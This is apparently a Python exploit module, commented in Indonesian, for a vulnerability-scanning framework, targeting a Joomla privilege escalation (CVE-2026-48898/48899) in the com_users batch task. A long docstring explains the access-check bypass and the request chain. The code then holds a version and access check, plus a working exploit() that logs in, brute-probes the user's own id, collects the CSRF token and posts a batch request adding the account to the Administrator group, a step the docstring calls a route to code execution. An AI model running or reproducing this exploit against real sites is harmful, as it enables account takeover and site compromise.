#!/usr/bin/env python3
"""
Joomla Core — CVE-2026-48898 / CVE-2026-48899  com_users batch task privilege escalation.

A logged-in backend user who has the `core.login.admin` privilege but NOT
`core.manage` on com_users (the Manager group, for example) can drive the
`com_users` batch task and add themselves to an arbitrary non-super user group.
The outcome is that they become an Administrator, which carries template editing
and therefore a route to code execution.

Affected: 4.0.0 - 5.4.5, 6.0.0 - 6.1.0     Patched: 5.4.6+ / 6.1.1+
CVSS: 9.8 (48898), 5.3 (48899)

ROOT CAUSE — two independent gaps, both fixed in the same release. Proved by
diffing the full packages 5.4.5 against 5.4.8.

(1) components/com_users Dispatcher grant the request a free pass on the wrong
    condition. In 5.4.5 `checkAccess()` reads a `layout` parameter straight from
    the request:

        $view   = $this->input->getCmd('view');
        $layout = $this->input->getCmd('layout');

        if (in_array($task, $allowedTasks, true) || ($view === 'user' && $layout === 'edit')) {
            $user = $this->app->getIdentity();
            $id   = $this->input->getInt('id');
            if ((int) $user->id === $id) { return; }      // <- returns without core.manage
        }
        parent::checkAccess();                            // <- would have thrown 403

    `layout` is attacker-controlled, so `?view=user&layout=edit&id=<own id>` walks
    past the parent check. The 5.4.8 version drops `$layout` entirely and requires
    the absence of a task:

        if (... || (in_array($view, ['user']) && !$task)) { ... }

    The same `layout=edit` comparison also satisfies `checkUserRequiresReset()`,
    so a user flagged for a forced password reset is not redirected away.

(2) The batch handlers in administrator/components/com_users Model/UserModel.php
    performed no component permission check at all. 5.4.5 opens `batchUser()`
    with:

        $iAmSuperAdmin = $this->getCurrentUser()->authorise('core.admin');
        if (!$iAmSuperAdmin && UserHelper::checkSuperUserInUsers($userIds)) { ... }
        if ((!$iAmSuperAdmin && Access::checkGroup($groupId, 'core.admin')) || $groupId < 1) { ... }

    A caller without `core.admin` is not rejected — the branch is simply skipped.
    There is no `core.manage` check anywhere in the method. The 5.4.8 version adds
    it at the top of both batchReset() and batchUser():

        if (!$this->getCurrentUser()->authorise('core.manage', 'com_users')) {
            $this->setError(Text::_('JLIB_APPLICATION_ERROR_BATCH_CANNOT_EDIT'));
            return false;
        }

(The controller and FormController::batch() only call checkToken(); no ACL. The
 `core.manage` gate that does exist lives in ComponentDispatcher::checkAccess(),
 which gap (1) bypasses.)

CHAIN

    POST /administrator/index.php
      option=com_users  view=user  layout=edit  id=<own uid>
      task=user.batch   <csrf-token>=1
      batch[group_id]=7  batch[group_action]=add  cid[]=<own uid>

    checkAccess()  -> returns early (view/layout/id match)      [gap 1]
    dispatch()     -> controller=user task=batch
    checkToken()   -> passes
    batchUser()    -> no core.manage check                      [gap 2]
    -> the attacker's user id is written into #__user_usergroup_map with group 7

Prerequisite: an account with `core.login.admin`. The Manager group (6) holds it
by default while lacking `core.manage`; the frontend guest path is closed because
com_users is not in AdministratorApplication::$allowedUnprivilegedOptions.

Note on the action name: the POST must carry task=user.batch (controller `user`,
which owns batch()), not users.batch. A GET for the CSRF token is best taken from
a page the account can already render, or from the dashboard itself.

LAB PROOF (Joomla 5.4.5, port 8108, user mgr in group 6)
  before : #__user_usergroup_map = (230, 6)
  after  : #__user_usergroup_map = (230, 6), (230, 7)
  com_users view=users   403 -> 200
  com_templates          403 -> 200   (template editing = code execution route)
Instrumented values recorded from checkAccess() during the run:
  task='user.batch' view='user' layout='edit' id=230 uid=230  -> grant
  task=NULL         view='user' layout='edit' id=230 uid=230  -> 403 (parent)
"""

import re

from mp import (CveModule, ST_CLEAN, ST_ERR, ST_INFO,
                ST_PWN, ST_SKIP, ST_VULN, detect_platform, register, ver_le)
PRODUCT = "Joomla! CMS"
VERSIONS_AFFECTED = "4.0.0-5.4.5, 6.0.0-6.1.0"

# Rentang yang sudah dipatch: >= 5.4.6 pada lini 5.x, >= 6.1.1 pada lini 6.x.
PATCHED_5 = (5, 4, 6)
PATCHED_6 = (6, 1, 1)

# Grup bawaan Joomla. 7 = Administrator; 8 sengaja tidak dipakai karena batch
# menolak super-admin group untuk pemanggil non-super.
ADMIN_GROUP = 7
# Batas atas pencarian id sendiri lewat probe bypass Dispatcher.
# 250 probe terukur ~10 detik pada lab, dan target dunia nyata jarang melampaui ini.
UID_SCAN_MAX = 250

AJAX_TOKEN_RE = re.compile(r'name="([0-9a-f]{32})"\s+value="1"')
ANY_TOKEN_RE = re.compile(r'"([0-9a-f]{32})"')
JS_TOKEN_RE = re.compile(r'"csrf\.token"\s*:\s*"([0-9a-f]{32})"')
ID_RE = re.compile(r'name="jform\[id\]"[^>]*value="(\d+)"')
LOGIN_OK_RE = re.compile(r"(com_cpanel|Control Panel|logout)", re.I)


def _norm(t):
    return t.url.rstrip("/")


def _ver_tuple(s):
    try:
        return tuple(int(x) for x in re.sub(r"[^0-9.]", "", str(s)).split(".") if x != "")
    except Exception:
        return ()


def _patched(ver):
    """True bila versi sudah memuat patch (>= 5.4.6 pada 5.x, >= 6.1.1 pada 6.x)."""
    if not ver:
        return False
    major = ver[0]
    if major >= 6:
        return ver_le(PATCHED_6, ver)
    if major == 5:
        return ver_le(PATCHED_5, ver)
    # 4.x seluruhnya rentan (patch hanya masuk ke 5.4.6 / 6.1.1)
    return False


def _version(h, t):
    """Ambil versi Joomla dari manifest resmi, fallback ke meta generator."""
    base = _norm(t)
    for path in ("administrator/manifests/files/joomla.xml", "language/en-GB/en-GB.xml"):
        try:
            r = h.get(f"{base}/{path}")
        except Exception:
            continue
        if r is not None and r.status_code == 200:
            m = re.search(r"<version>\s*([\d.]+)", r.text or "")
            if m:
                return m.group(1)
    try:
        r = h.get(base + "/")
        m = re.search(r'content="Joomla!\s*-?\s*([\d.]+)', r.text or "")
        if m:
            return m.group(1)
    except Exception:
        pass
    return ""


def _login(h, t, opts):
    """Login ke backend. Return (session_ok, uid, token) atau (False, None, None)."""
    user = getattr(opts, "username", None) if opts else None
    pw = getattr(opts, "password", None) if opts else None
    if not user or not pw:
        return False, None, None
    base = _norm(t)
    try:
        r = h.get(f"{base}/administrator/index.php")
    except Exception:
        return False, None, None
    if r is None:
        return False, None, None
    m = AJAX_TOKEN_RE.search(r.text or "")
    tok = m.group(1) if m else ""
    data = {"username": user, "passwd": pw, "option": "com_login",
            "task": "login", "return": "aW5kZXgucGhw"}
    if tok:
        data[tok] = "1"
    try:
        r2 = h.post(f"{base}/administrator/index.php", data=data)
    except Exception:
        return False, None, None
    if r2 is None or not LOGIN_OK_RE.search(r2.text or ""):
        return False, None, None
    return True, _find_uid(h, t), tok


def _find_uid(h, t):
    """Temukan id pengguna sendiri.

    Tidak ada halaman backend yang membocorkannya secara langsung untuk akun
    tanpa core.manage. Namun Dispatcher::checkAccess() pada versi rentan hanya
    memberi izin bila id pada request sama dengan id pemanggil, jadi id dapat
    dipastikan dengan menaikkan id sampai satu di antaranya berubah dari 403
    menjadi 200. Dibatasi supaya tidak menjadi pemindaian besar: dimulai dari id
    kandidat yang biasa (1..UID_SCAN_MAX) dan berhenti pada kecocokan pertama.
    """
    base = _norm(t)
    # Jalur cepat: beberapa instalasi mengirim id sendiri pada halaman profil
    # walaupun core.manage tidak ada.
    for probe in (f"{base}/administrator/index.php?option=com_users&view=user&layout=edit",
                  f"{base}/administrator/index.php?option=com_cpanel"):
        try:
            r = h.get(probe)
        except Exception:
            continue
        if r is None:
            continue
        m = ID_RE.search(r.text or "")
        if m:
            return m.group(1)
        m = re.search(r'option=com_users&(?:amp;)?view=user&(?:amp;)?layout=edit'
                      r'&(?:amp;)?id=(\d+)', r.text or "")
        if m:
            return m.group(1)
    # Jalur lambat: naikkan id sampai satu di antaranya memberi izin.
    for uid in range(1, UID_SCAN_MAX + 1):
        url = (f"{base}/administrator/index.php?option=com_users&view=user"
               f"&layout=edit&id={uid}&task=user.batch")
        try:
            r = h.get(url)
        except Exception:
            continue
        if r is not None and r.status_code == 200:
            return str(uid)
    return None


def _token(h, t, uid):
    """Ambil CSRF token sesi.

    Joomla mengeksposnya sebagai `"csrf.token":"<hex32>"` di opsi JavaScript
    setiap halaman backend, dan Session::checkToken() menerimanya lewat header
    X-CSRF-Token maupun sebagai field POST. Halaman yang tidak memuat form
    (mis. dashboard) hanya punya bentuk JS ini, jadi itu yang dicari lebih dulu.
    """
    base = _norm(t)
    urls = [f"{base}/administrator/index.php?option=com_cpanel",
            f"{base}/administrator/index.php"]
    if uid:
        urls.insert(0, f"{base}/administrator/index.php?option=com_users"
                       f"&view=user&layout=edit&id={uid}&task=user.batch")
    for url in urls:
        try:
            r = h.get(url)
        except Exception:
            continue
        if r is None or r.status_code not in (200, 500):
            continue
        m = JS_TOKEN_RE.search(r.text or "")
        if m:
            return m.group(1)
        m = AJAX_TOKEN_RE.search(r.text or "")
        if m:
            return m.group(1)
    return ""


def check(t, h, opts):
    """Non-destruktif: login, lalu uji apakah bypass Dispatcher memberi akses.

    Tidak ada penulisan grup. Bila akun bisa mencapai halaman com_users yang
    sebelumnya 403, atau batch() dapat dipanggil tanpa 403, target rentan.
    """
    plat = detect_platform(t, h)
    if plat != "joomla":
        return ST_SKIP, "bukan Joomla", ""
    ver = _ver_tuple(_version(h, t))
    detail = f"joomla={'.'.join(map(str, ver)) if ver else '?'}"
    if ver and _patched(ver):
        return ST_CLEAN, f"Joomla {'.'.join(map(str, ver))} sudah dipatch (>= 5.4.6)", detail

    user = getattr(opts, "username", None) if opts else None
    if not user:
        if ver and not _patched(ver):
            return (ST_INFO,
                    "Joomla dalam rentang rentan; butuh --username/--password akun "
                    "dengan core.login.admin untuk membuktikan bypass",
                    detail + " requires=core.login.admin")
        return ST_INFO, "versi tidak terbaca", detail

    ok, uid, tok = _login(h, t, opts)
    if not ok:
        return ST_ERR, "login backend gagal (cek --username/--password)", detail
    if not uid:
        return (ST_INFO,
                f"login berhasil; id pengguna tidak ditemukan dalam 1..{UID_SCAN_MAX} "
                "(kemungkinan sudah dipatch atau akun punya core.manage)", detail)

    base = _norm(t)
    # Dua request: satu tanpa task (harus 403 pada versi patched) dan satu
    # membawa task=user.batch (lolos pada versi rentan karena checkAccess).
    probe = (f"{base}/administrator/index.php?option=com_users&view=user&layout=edit"
             f"&id={uid}")
    try:
        r1 = h.get(probe)
    except Exception:
        r1 = None
    plain = r1.status_code if r1 is not None else None

    urls_batch = (f"{base}/administrator/index.php?option=com_users&view=user&layout=edit"
                  f"&id={uid}&task=user.batch")
    try:
        r2 = h.get(urls_batch)
    except Exception:
        r2 = None
    with_task = r2.status_code if r2 is not None else None

    detail += f" uid={uid} no_task={plain} with_task={with_task}"
    _ = tok

    if with_task == 200 and plain == 403:
        return (ST_VULN,
                "bypass Dispatcher com_users terbukti (403 tanpa task, 200 dengan task)",
                detail + " | gap 1: Dispatcher::checkAccess memakai $layout dari request; "
                         "gap 2: UserModel::batchUser tanpa core.manage")
    if with_task == 200:
        return (ST_VULN, "task=user.batch diterima tanpa core.manage", detail)
    if plain == 403 and with_task == 403:
        return ST_CLEAN, "kedua bentuk ditolak 403 (patched)", detail
    return ST_INFO, "respons tidak konklusif", detail


def exploit(t, h, opts):
    """Tambahkan akun operator ke grup 7 (Administrator) lewat batch task."""
    plat = detect_platform(t, h)
    if plat != "joomla":
        return ST_SKIP, "bukan Joomla", ""
    ver = _ver_tuple(_version(h, t))
    if ver and _patched(ver):
        return ST_CLEAN, f"Joomla {'.'.join(map(str, ver))} sudah dipatch (>= 5.4.6)", \
            f"joomla={'.'.join(map(str, ver))}"

    ok, uid, _ = _login(h, t, opts)
    if not ok or not uid:
        return ST_ERR, "login backend gagal atau id pengguna tidak terbaca", ""

    base = _norm(t)
    tok = _token(h, t, uid)
    detail = f"joomla={'.'.join(map(str, ver)) if ver else '?'} uid={uid} group={ADMIN_GROUP}"

    # POST batch dengan parameter bypass LENGKAP: view/layout/id harus ada agar
    # checkAccess() memberi izin, sementara task mengarahkan ke controller batch.
    data = {
        "option": "com_users",
        "view": "user",
        "layout": "edit",
        "id": uid,
        "task": "user.batch",
        "batch[group_id]": str(ADMIN_GROUP),
        "batch[group_action]": "add",
        "cid[]": uid,
    }
    # Token juga dikirim sebagai field POST: sebagian instalasi memfilter header.
    if tok:
        data[tok] = "1"
    headers = {"X-CSRF-Token": tok} if tok else {}
    try:
        r = h.post(f"{base}/administrator/index.php", data=data, headers=headers)
    except TypeError:
        # Http versi lama tidak menerima headers pada post()
        try:
            r = h.post(f"{base}/administrator/index.php", data=data)
        except Exception as e:
            return ST_ERR, f"POST batch gagal: {type(e).__name__}", detail
    except Exception as e:
        return ST_ERR, f"POST batch gagal: {type(e).__name__}", detail

    # Verifikasi: apakah akun kini lolos ke halaman yang butuh core.manage?
    try:
        rv = h.get(f"{base}/administrator/index.php?option=com_users&view=users")
    except Exception:
        rv = None
    escalated = rv is not None and rv.status_code == 200
    detail += f" batch_http={r.status_code if r is not None else 'ERR'} users_page={rv.status_code if rv is not None else 'ERR'}"

    if escalated:
        return (ST_PWN,
                f"privesc via com_users batch: uid {uid} ditambahkan ke grup {ADMIN_GROUP} (Administrator)",
                detail + " | jalur: view=user&layout=edit&id=<uid> melewati "
                         "ComponentDispatcher::checkAccess, task=user.batch mencapai "
                         "UserModel::batchUser yang tidak memeriksa core.manage")
    if r is not None and r.status_code in (200, 303, 302):
        return ST_VULN, "batch diterima tanpa core.manage (verifikasi grup manual)", detail
    return ST_INFO, "batch tidak konklusif", detail


register(CveModule(
    cve="CVE-2026-48898",
    cluster="joomla_core",
    title="Joomla Core - Privilege escalation via com_users batch task",
    vclass="privesc / broken access control (authenticated)",
    cwe="CWE-284",
    cvss="9.8",
    severity="CRITICAL",
    product=PRODUCT,
    versions_affected=VERSIONS_AFFECTED,
    status="verified",
    requires=["akun backend dengan core.login.admin (mis. grup Manager)",
              "akun tersebut TIDAK memiliki core.manage pada com_users"],
    check=check,
    exploit=exploit,
    notes=("Dua celah independen, keduanya ditutup pada rilis yang sama; dibuktikan dengan "
           "diff paket penuh 5.4.5 vs 5.4.8. (1) components/com_users/src/Dispatcher/"
           "Dispatcher.php::checkAccess() pada 5.4.5 membaca $layout dari request dan "
           "memberi izin bila view=user && layout=edit && id==id sendiri, sehingga "
           "parent::checkAccess() (yang melempar 403 tanpa core.manage) tidak pernah "
           "dijalankan. 5.4.8 membuang $layout dan menambahkan syarat !$task. "
           "(2) administrator/components/com_users/src/Model/UserModel.php::batchUser() "
           "dan batchReset() pada 5.4.5 sama sekali tidak memeriksa core.manage; keduanya "
           "hanya menyaring super-admin, sehingga pemanggil tanpa core.admin tidak ditolak. "
           "5.4.8 menambahkan authorise('core.manage','com_users') di awal kedua method. "
           "FormController::batch() dan UserController::batch() hanya memanggil checkToken(). "
           "Lab-verified di Joomla 5.4.5 (port 8108): sebelum (230,6), sesudah (230,6),(230,7); "
           "com_users view=users 403->200; com_templates 403->200. Nilai yang terekam di "
           "checkAccess: task='user.batch' view='user' layout='edit' id=230 uid=230 -> izin; "
           "task=NULL -> 403. Prasyarat core.login.admin: grup Manager (6) memilikinya tanpa "
           "core.manage; jalur tamu tertutup karena com_users tidak ada di "
           "AdministratorApplication::$allowedUnprivilegedOptions. Task harus user.batch, "
           "bukan users.batch."),
))
